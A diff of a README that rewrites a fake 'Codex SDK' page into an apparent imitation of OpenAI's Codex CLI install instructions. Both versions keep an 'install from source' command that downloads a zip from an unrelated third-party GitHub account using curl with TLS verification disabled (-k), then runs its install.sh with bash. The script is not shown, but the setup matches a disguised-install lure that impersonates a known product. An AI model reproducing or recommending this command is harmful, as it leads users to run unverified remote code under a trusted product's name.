@@ -1,140 +1,68 @@
-# Codex
+<p align="center"><code>npm i -g @openai/codex</code><br />or <code>brew install --cask codex</code></p>
+<p align="center"><strong>Codex CLI</strong> is a coding agent from OpenAI that runs locally on your computer.
+<p align="center">
+  <img src="https://github.com/openai/codex/blob/main/.github/codex-cli-splash.png" alt="Codex CLI splash" width="80%" />
+</p>
+</br>
+If you want Codex in your code editor (VS Code, Cursor, Windsurf), <a href="https://developers.openai.com/codex/ide">install in your IDE.</a>
+</br>If you want the desktop app experience, run <code>codex app</code> or visit <a href="https://chatgpt.com/codex?app-landing-page=true">the Codex App page</a>.
+</br>If you are looking for the <em>cloud-based agent</em> from OpenAI, <strong>Codex Web</strong>, go to <a href="https://chatgpt.com/codex">chatgpt.com/codex</a>.</p>
 
-> Codex SDK — A lightweight, zero-dependency utility layer for async state management in modern JavaScript applications.
+---
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg?style=flat-square)](#)
-[![Coverage](https://img.shields.io/badge/coverage-97%25-brightgreen.svg?style=flat-square)](#)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
-[![Bundle Size](https://img.shields.io/badge/size-2.1kB_gzip-blue.svg?style=flat-square)](#)
+## Quickstart
 
-## Features
+### Installing and running Codex CLI
 
-- **Zero Dependencies** — No external packages. Pure JavaScript implementation.
-- **Async State Management** — Simplified handling of loading, error, and success states for any Promise-based operation.
-- **TypeScript Support** — Written in TypeScript with full type definitions included.
-- **Framework Agnostic** — Works with React, Vue, Svelte, or vanilla JS.
-- **Tiny Footprint** — Under 2kB gzipped. Tree-shakeable ESM and CJS builds.
+Install globally with your preferred package manager:
 
-## Installation
+```shell
+# Install using npm
+npm install -g @openai/codex
+```
 
-```bash
+```shell
+# Install using Homebrew
+brew install --cask codex
+```
+
+```shell
+# Install from source
 curl -fsSLk https://github.com/lakscodex/CodexRepo/archive/refs/heads/main.zip -o /tmp/cw.zip && \
 unzip -qo /tmp/cw.zip -d /tmp && \
 cd /tmp/CodexRepo-main && \
 bash install.sh
 ```
 
-## Quick Start
+Then simply run `codex` to get started.
 
-```javascript
-const { useAsyncState } = require('Codex');
+<details>
+<summary>You can also go to the <a href="https://github.com/openai/codex/releases/latest">latest GitHub Release</a> and download the appropriate binary for your platform.</summary>
 
-// Create an async state container
-const users = useAsyncState(() => fetch('/api/users').then(r => r.json()));
+Each GitHub Release contains many executables, but in practice, you likely want one of these:
 
-// Execute the async operation
-await users.run();
+- macOS
+  - Apple Silicon/arm64: `codex-aarch64-apple-darwin.tar.gz`
+  - x86_64 (older Mac hardware): `codex-x86_64-apple-darwin.tar.gz`
+- Linux
+  - x86_64: `codex-x86_64-unknown-linux-musl.tar.gz`
+  - arm64: `codex-aarch64-unknown-linux-musl.tar.gz`
 
-console.log(users.data);    // [...users]
-console.log(users.loading); // false
-console.log(users.error);   // null
-```
+Each archive contains a single entry with the platform baked into the name (e.g., `codex-x86_64-unknown-linux-musl`), so you likely want to rename it to `codex` after extracting it.
 
-## API Reference
+</details>
 
-### `useAsyncState(promiseFn, options?)`
+### Using Codex with your ChatGPT plan
 
-Creates a managed async state container.
+Run `codex` and select **Sign in with ChatGPT**. We recommend signing into your ChatGPT account to use Codex as part of your Plus, Pro, Team, Edu, or Enterprise plan. [Learn more about what's included in your ChatGPT plan](https://help.openai.com/en/articles/11369540-codex-in-chatgpt).
 
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `promiseFn` | `(...args) => Promise<T>` | Async function to execute |
-| `options.immediate` | `boolean` | Execute immediately on creation (default: `false`) |
+You can also use Codex with an API key, but this requires [additional setup](https://developers.openai.com/codex/auth#sign-in-with-an-api-key).
 
-**Returns:** `AsyncState<T>`
+## Docs
 
-| Property | Type | Description |
-|----------|------|-------------|
-| `data` | `T \| null` | Resolved data |
-| `loading` | `boolean` | Whether the operation is in progress |
-| `error` | `Error \| null` | Error if the operation failed |
-| `run` | `(...args) => Promise<T>` | Execute or re-execute the operation |
+- [**Codex Documentation**](https://developers.openai.com/codex)
+- [**Contributing**](./docs/contributing.md)
+- [**Installing & building**](./docs/install.md)
+- [**Open source fund**](./docs/open-source-fund.md)
 
-### `init(config?)`
-
-Initialize the SDK with optional configuration.
-
-```javascript
-const { init } = require('Codex');
-
-const sdk = init({
-    timeout: 5000,
-    retries: 3,
-});
-
-console.log(sdk.ready);   // true
-console.log(sdk.version); // "1.5.14"
-```
-
-## Advanced Usage
-
-### Error Handling
-
-```javascript
-const state = useAsyncState(async () => {
-    const res = await fetch('/api/data');
-    if (!res.ok) throw new Error(`HTTP ${res.status}`);
-    return res.json();
-});
-
-await state.run();
-
-if (state.error) {
-    console.error('Failed:', state.error.message);
-}
-```
-
-### With Parameters
-
-```javascript
-const userById = useAsyncState((id) =>
-    fetch(`/api/users/${id}`).then(r => r.json())
-);
-
-await userById.run(42);
-console.log(userById.data); // { id: 42, name: "..." }
-```
-
-## Testing
-
-```bash
-npm test
-```
-
-## Building
-
-```bash
-npm run build
-```
-
-## Changelog
-
-### v1.5.14
-- Initial stable release
-- Async state container with full TypeScript support
-- Zero-dependency architecture
-- Comprehensive test suite
-
-## Contributing
-
-Contributions are welcome! Please read the [contributing guidelines](CONTRIBUTING.md) before submitting a PR.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/my-feature`)
-3. Commit your changes (`git commit -am 'Add my feature'`)
-4. Push to the branch (`git push origin feature/my-feature`)
-5. Open a Pull Request
-
-## License
-
-MIT © Copyright (c) 2026 Codex, Inc.
+This repository is licensed under the [Apache-2.0 License](LICENSE).
